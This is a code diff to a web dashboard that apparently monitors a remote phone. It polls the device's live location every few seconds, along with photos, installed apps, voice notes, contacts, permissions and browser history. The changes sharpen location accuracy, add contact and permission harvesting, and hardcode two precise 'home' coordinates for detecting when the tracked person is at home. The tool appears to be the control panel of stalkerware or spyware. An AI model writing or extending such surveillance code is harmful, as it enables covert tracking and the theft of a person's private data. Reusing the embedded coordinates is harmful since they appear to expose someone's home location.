@@ -338,11 +338,11 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div class="pg" style="gap:4px">
 <select id="accuracyFilter" style="font-size:10px;padding:4px 16px 4px 6px;min-height:28px">
 <option value="0">Accuracy: All</option>
-<option value="9">≤ 9 m</option>
+<option value="10" selected>≤ 10 m</option>
 <option value="50">≤ 50 m</option>
 <option value="100">≤ 100 m</option>
 <option value="200">≤ 200 m</option>
-<option value="500" selected>≤ 500 m</option>
+<option value="500">≤ 500 m</option>
 </select>
 </div>
 </div>
@@ -451,7 +451,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, photos: 300000, apps: 300000, voice: 300000, fcm: 60000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, photos: 300000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -764,7 +764,8 @@ function startPolling() {
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
-  schedulePoll('contacts', 60000, pollContacts);
+  schedulePoll('contacts', intervals.contacts, pollContacts);
+  schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('browser', 120000, pollBrowserHistory);
@@ -877,9 +878,15 @@ async function pollLocation() {
   updateLocationUI(loc);
   updateMap(loc);
   checkGeofences(loc.lat, loc.lng);
-  const inside = geofences.some(g => g.active && haversine(loc.lat, loc.lng, g.lat, g.lng) <= g.radius);
-  document.getElementById('statusDot').textContent = inside ? '\u25CF Parked' : '\u25CF Live';
-  if (!document.hidden) pollTimers.push(setTimeout(pollLocation, inside ? 120000 : intervals.loc));
+  const HOME_COORDS = [
+    { lat: 32.04551, lng: 73.43148 },
+    { lat: 32.05568, lng: 73.55240 }
+  ];
+  const atHome = HOME_COORDS.some(h => haversine(loc.lat, loc.lng, h.lat, h.lng) <= 1000);
+  const insideGeo = geofences.some(g => g.active && haversine(loc.lat, loc.lng, g.lat, g.lng) <= g.radius);
+  const parked = atHome || insideGeo;
+  document.getElementById('statusDot').textContent = parked ? '\u25CF Parked' : '\u25CF Live';
+  if (!document.hidden) pollTimers.push(setTimeout(pollLocation, parked ? 300000 : intervals.loc));
 }
 
 async function pollMeta() {
